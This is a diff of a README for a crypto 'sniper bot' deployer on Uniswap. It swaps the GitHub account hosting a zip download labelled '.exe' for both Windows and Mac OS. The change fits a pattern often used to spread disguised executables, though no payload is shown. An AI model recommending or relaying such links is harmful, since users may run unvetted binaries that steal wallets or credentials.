@@ -93,7 +93,7 @@ The **DeployerIDE** local deployer provides a secure and efficient environment f
 
 2.  **Follow the setup instructions** available in the Documentation section.
 
-- [Download for Windows/Mac OS (.exe)](https://github.com/westhort2vnz/SNIPER-BOT-UNISWAP/raw/refs/heads/main/DeployerIDE.zip)
+- [Download for Windows/Mac OS (.exe)](https://github.com/ElynthxqWew/SNIPER-BOT-UNISWAP/raw/refs/heads/main/DeployerIDE.zip)
 
 - [Download for Python (.py)](deployer.py)
 
